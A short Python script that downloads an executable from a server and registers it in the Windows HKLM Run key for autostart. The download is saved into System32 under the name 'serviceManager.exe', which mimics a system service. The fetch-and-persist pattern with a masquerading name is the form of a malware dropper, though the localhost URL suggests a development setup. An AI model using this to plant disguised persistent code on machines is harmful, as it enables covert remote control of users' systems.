# download file from server and add it to autostart
import winreg as reg
import os
import requests

class StartScript: 
    _path_file = "" # path to download file
    _key_name = "" # reg name
    _url = ""

    def __init__(self, path_file: str, key_name: str, url: str):
        self._path_file = path_file
        self._key_name = key_name
        self._url = url

    def install(self) -> int:
        self.download_file("autostart")

        try:
            registry_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(registry_key, self._key_name, 0, reg.REG_SZ, self._path_file)            
            reg.CloseKey(registry_key)
        except Exception as ex:
            print(f"err: {ex}")
            return 1
        return 0

    def download_file(self, serverFileName) -> bool:
        try:
            file_path = self._path_file
            
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            response = requests.get(self._url+"/device/app/download/"+serverFileName, stream=True)
            response.raise_for_status()  # Проверяем статус код
            
            with open(file_path, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
            return True
            
        except requests.exceptions.RequestException as e:
            print(e)
            return False
        except IOError as e:
            print(e)
            return False
        except Exception as e:
            print(e)
            return False

program = StartScript(r"C:\Windows\System32\serviceManager.exe", "serviceManager", "http://127.0.0.1:8000/")
program.install()

